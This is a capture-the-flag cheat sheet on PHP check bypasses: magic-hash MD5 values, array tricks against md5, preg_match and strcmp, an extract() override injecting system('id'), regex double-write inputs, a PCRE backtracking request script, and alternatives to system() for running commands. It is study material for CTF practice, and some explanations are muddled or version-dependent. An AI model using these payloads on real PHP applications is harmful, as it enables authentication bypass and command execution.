# PHP Bypass Tips Cheat Sheet

## PHP Weak comparison bypass ($a == md5($a))

PHP In weak type comparison,`0e` The leading string is treated as scientific notation, equal to `0`.

**⚠️ Key conditions:`0e` must be all numbers after (0-9), cannot contain letters!**
- ✅ `0e830400451993494058024219903391` → pure numbers,PHP as `0 × 10^830...` = `0`
- ❌ `0e993dffb88165eb32369e16dd25b536` → Contains letters `d`/`f`,PHP Not treated as scientific notation, compared by string

| value | MD5 result | 0epost pure numbers? | illustrate |
|----|---------|------------|------|
| QNKCDZO | 0e830400451993494058024219903391 | ✅ | 0e beginning,PHP `==` regarded as 0 |
| 240610708 | 0e462097431906509019562988736854 | ✅ | Same as above |
| s878926199a | 0e545993274517709034328855841020 | ✅ | Same as above |
| s155964671a | 0e342768416822451524974117254469 | ✅ | Same as above |
| s214587387a | 0e848204310308006290363795692068 | ✅ | Same as above |
| s1091221200a | 0e940625744785414655937625828514 | ✅ | Same as above |
| 0e215962017 | 0e291242476940776845150308577824 | ✅ | Same as above |

**⚠️ Don’t search violently by yourself md5 collision value** — Use the values ​​in the table above directly, they are verified to be available.

## PHP Weak comparison bypass ($a != $b && md5($a) == md5($b))

**⚠️ Key conditions:`0e` must be all numbers after (0-9), cannot contain letters!**

| value A | value B | MD5(value A) | MD5(value B) | 0epost pure numbers? |
|------|------|----------|----------|------------|
| QNKCDZO | 240610708 | 0e830400... | 0e462097... | ✅ It will be all right |
| s878926199a | s155964671a | 0e545993... | 0e342768... | ✅ It will be all right |
| QNKCDZO | s878926199a | 0e830400... | 0e545993... | ✅ It will be all right |

**⚠️ Violent search md5 Value is usually not available** — `0e993dffb...` Contains letters d/f,PHP Not treated as scientific notation, weak comparison fails. Use the verified values ​​in the table above directly.

## PHP Strict comparison bypass ($a !== $b && md5($a) === md5($b))

`md5()` Unable to process array, passing in array returns `NULL`,`NULL === NULL` for `true`:
```
?a[]=1&b[]=2
md5($_GET['a']) === md5($_GET['b'])  // NULL === NULL → true
```

## Array bypass

`preg_match()` Can only process strings, pass in an array and return `false`:
```
?p[]=nss2&p[]=ctf
// preg_match("/n|c/", $_GET['p']) → false(no match, bypass)
```

`call_user_func` Accepts an array as callback:
```php
call_user_func(array('ClassName', 'methodName'))  // Equivalent to ClassName::methodName()
call_user_func(['nss2', 'ctf'])                   // Equivalent to nss2::ctf()
```

## extract() Variable override

`extract($_GET)` Will use GET Parameters overwrite existing variables:
```
?_GET[cmd]=system('id')
```

## intval() bypass

```php
if (intval($_GET['num']) === 0) { ... }
// Bypass:
?num=0x10     // hexadecimal,intval Not parsed by default
?num=+0       // positive sign prefix
?num=0e123    // scientific notation
?num[]=1      // array,intval return 1
```

## PHP Regular bypass

| scene | method | Example |
|------|------|------|
| Regular None `i` modifier | Case bypass | `Nss2::Ctf` bypass `/n\|c/m` |
| preg_match Check only string | Array bypass | `p[]=xxx` make preg_match return false |
| `^$` + `m` modifier | Newline bypass | `aaa%0abbb` bypass `/^aaa$/m` |
| `.` Does not match newlines | `%0a` bypass | Insert newline character |
| Backtracking limit | Very long string | Construct a very long string to let preg_match return false(PCRE Backtracking limit default 100 Ten thousand) |

### ⭐ preg_replace Double write bypass (high frequency test site)

**scene**:`preg_replace('/keywords/', '', $input)` Need result after replacement**equal to the keyword itself**

**Core principles**: Embed the complete keyword in the middle of the keyword, replace the inner layer and then combine the outer layer to form the original word.

**Generic construct**:`Key words first half + keywords + Keywords second half`

| filter keywords | Double write input | replacement process | result |
|-----------|---------|---------|------|
| NSSCTF | `NSSNSSCTFCTF` | delete middle NSSCTF → NSS+CTF | `NSSCTF` ✅ |
| flag | `flflagag` | delete middle flag → fl+ag | `flag` ✅ |
| cat | `cacatt` | delete middle cat → ca+t | `cat` ✅ |
| system | `syssystemtem` | delete middle system → sys+tem | `system` ✅ |
| hack | `hahackck` | delete middle hack → ha+ck | `hack` ✅ |

**⚠️ Why doesn’t case bypass work?**:
- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` no match `NSS` → Return as is `NssCTF`
- `NssCTF !== "NSSCTF"` → Strict comparison fails → failed
- Double-write bypass is the only way to make the replacement result**Exactly equal to the original string**method

**recognition signal**:
- Source code contains `preg_replace('/X/', '', $str)` and `$str === "X"` → Double write bypass
- Source code contains `str_replace('X', '', $str)` and `$str === "X"` → Also applies to double-write bypass

### PCRE Backtracking limit bypass

```python
import requests
url = "http://target/index.php"
# Construct a very long string to let preg_match Backtracking beyond limit return false
payload = "a" * 1000000 + "evil_content"
data = {"input": payload}
r = requests.post(url, data=data)
print(r.text)
```

## PHP function/Feature bypass quick check

| scene | method | Example |
|------|------|------|
| Regular None `i` | Case bypass | `Nss2::Ctf` bypass `/n\|c/m` |
| preg_match string limit | Array bypass | `p[]=nss2&p[]=ctf` |
| call_user_func Class calling method | Array callback | `call_user_func(['nss2','ctf'])` |
| Function name contains prohibited characters | Find a replacement function | `readfile` Does not contain n/c |
| extract Variable override | Override key variables | Modify certification/Permission related variables |
| is_numeric examine | hexadecimal/scientific notation | `0x10`、`1e1` |
| strcmp Compare | Array bypass | `pass[]=1` make strcmp return NULL |
| in_array weak type | Type deception | `"0admin"` Pass `in_array(0, ['admin'])` |

## PHP Code execution alternative function

When `system` / `exec` When banned:

| Functions | Usage | Echo |
|------|------|------|
| `system($cmd)` | Direct execution | Has echo (output to stdout) |
| `exec($cmd, $output)` | Execute and store in array | No direct echo, requires `print_r($output)` |
| `passthru($cmd)` | Directly execute output raw data | With echo |
| `shell_exec($cmd)` | Return string | No echo, need `echo` |
| `Backtick \`$cmd\`` | Equivalent to shell_exec | No echo, need `echo` |
| `popen($cmd, 'r')` | Open process pipeline | Required `fread` Read |
| `proc_open()` | More flexible process control | Must be read manually |
